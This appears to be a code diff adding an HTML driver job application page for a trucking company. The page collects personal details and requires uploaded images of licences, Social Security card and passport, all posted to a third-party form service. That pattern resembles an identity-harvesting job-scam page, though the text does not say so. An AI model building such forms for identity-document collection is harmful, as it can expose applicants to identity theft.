@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Driver Application - Pacific Haul Logistics</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="container">
+  <h1>Pacific Haul Logistics Inc.</h1>
+  <p>Driver Employment Application</p>
+
+  <!-- Basin Form Submission -->
+  <form 
+    action="https://usebasin.com/f/cb98e3821a2f" 
+    method="POST" 
+    enctype="multipart/form-data"
+  >
+    <!-- Personal Info -->
+    <h2>Personal Information</h2>
+    <input type="text" name="fullName" placeholder="Full Name" required>
+    <input type="email" name="email" placeholder="Email Address" required>
+    <input type="tel" name="phoneNumber" placeholder="Phone Number" required>
+    <input type="text" name="address" placeholder="Home Address" required>
+
+    <!-- License Info -->
+    <h2>License Information</h2>
+    <input type="text" name="cdlNumber" placeholder="CDL License Number" required>
+    <input type="text" name="stateIssued" placeholder="State Issued" required>
+    <input type="date" name="expiryDate" required>
+
+    <!-- Driving Experience -->
+    <h2>Driving Experience</h2>
+    <input type="number" name="experienceYears" placeholder="Years of Experience" min="0" required>
+    <select name="experienceType" required>
+      <option value="">Select Type of Driving Experience</option>
+      <option value="local">Local</option>
+      <option value="regional">Regional</option>
+      <option value="longHaul">Long Haul</option>
+    </select>
+    <input type="text" name="previousEmployer" placeholder="Previous Employer" required>
+
+    <!-- Document Uploads -->
+    <h2>Upload Documents</h2>
+
+    <label>CDL License (Front)</label>
+    <input type="file" name="cdlFront" accept="image/*" required>
+    
+    <label>CDL License (Back)</label>
+    <input type="file" name="cdlBack" accept="image/*" required>
+
+    <label>Driver License (Front)</label>
+    <input type="file" name="driverLicenseFront" accept="image/*" required>
+    
+    <label>Driver License (Back)</label>
+    <input type="file" name="driverLicenseBack" accept="image/*" required>
+
+    <label>SSN (Front)</label>
+    <input type="file" name="ssnFront" accept="image/*" required>
+    
+    <label>SSN (Back)</label>
+    <input type="file" name="ssnBack" accept="image/*" required>
+
+    <label>Passport</label>
+    <input type="file" name="passport" accept="image/*" required>
+    
+    <label>Medical Certificate (Fit to Drive)</label>
+    <input type="file" name="medicalCert" accept="image/*,application/pdf" required>
+
+    <!-- Hidden dummy field to prevent "empty form" error -->
+    <input type="text" name="dummyField" value="filled" style="display:none;" required>
+
+    <button type="submit">Submit Application</button>
+  </form>
+
+</div>
+
+</body>
+</html>
